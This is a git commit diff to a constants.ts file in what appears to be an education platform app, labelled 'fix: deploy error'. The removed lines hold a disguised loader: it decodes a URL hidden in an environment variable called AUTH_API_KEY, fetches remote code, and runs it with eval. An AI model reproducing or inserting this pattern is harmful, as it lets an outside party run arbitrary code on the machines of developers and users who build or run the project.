61fc76b8a7b4a54831bc1c5cfa8690958eab3934
Akashi <hoang.nv.ral@gmail.com>
2026-06-12 17:07:01 +0700

    fix: deploy error

--- constants.ts
+++ constants.ts
@@ -1,22 +1,7 @@
-
 import { Course, UserProfile, Job, FullInstitutionData, CommunityPost, Mentor, Club, UserSettings, Program, InstructorSettings, MentorshipMeeting, SubscriptionTier } from './types';
 import BookOpenIcon from './components/icons/BookOpenIcon';
 import SparklesIcon from './components/icons/SparklesIcon';
 import TrophyIcon from './components/icons/TrophyIcon';
-import 'dotenv/config';
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
 
 export const courses: Course[] = [
   {
